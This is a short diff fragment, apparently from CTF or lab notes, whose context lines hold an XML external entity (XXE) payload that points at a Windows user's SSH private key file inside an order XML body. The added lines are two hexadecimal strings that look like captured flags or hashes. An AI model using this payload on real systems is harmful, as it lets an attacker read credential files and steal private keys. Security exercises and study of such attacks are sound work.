@@ -41,3 +41,7 @@ PHP
 <!DOCTYPE foo [<!ENTITY example SYSTEM "c:/users/daniel/.ssh/id_rsa"> ]>
 <order><quantity>123</quantity><item>
 &example;</item><address>1232132131232</address></order>
+
+032d2fc8952a8c24e39c8f0ee9918ef7
+
+f574a3e7650cebd8c39784299cb570f8
